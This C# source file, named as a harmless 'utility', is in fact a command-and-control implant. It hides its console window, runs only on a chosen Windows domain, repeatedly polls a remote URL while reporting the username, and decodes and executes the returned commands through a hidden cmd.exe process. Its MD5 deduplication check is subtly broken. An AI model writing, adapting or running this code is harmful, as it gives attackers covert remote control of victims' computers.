using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace CSharpUtility
{

    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        static void Execute(string cmd)
        {
            try
            {
                Process p = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                startInfo.UseShellExecute = false;
                startInfo.FileName = "cmd.exe";
                startInfo.CreateNoWindow = true;
                startInfo.Arguments = cmd;
                p.StartInfo = startInfo;
                p.Start();

            }
            catch (Exception e)
            {

            }
        }

        static void Main(string[] args)
        {
            string url = args.Length > 1 ? args[0] : "URL";
            byte[] currentMd5 = { };
            ShowWindow(GetConsoleWindow(), 0);
            if (Environment.GetEnvironmentVariable("USERDOMAIN") == "CHANGEME")
            {
                WebClient client = new WebClient();
                IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
                if (defaultProxy != null)
                {
                    defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                    client.Proxy = defaultProxy;
                }

                while (true)
                {
                    byte[] cmd = client.DownloadData(url + "?" + Environment.GetEnvironmentVariable("USERNAME"));
                    Array.Reverse(cmd, 0, cmd.Length);
                    string run = Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));

                    MD5 md5 = MD5.Create();
                    byte[] md5Result = md5.ComputeHash(Encoding.ASCII.GetBytes(run));

                    if (!Array.Equals(md5Result, currentMd5))
                    {
                        if (run.Length > 0)
                        {
                            Thread t = new Thread(() => Execute(run));
                            t.Start();
                            Thread.Sleep(10000);
                        }
                    }
                    currentMd5 = md5Result;
                }
            }
        }
    }
}
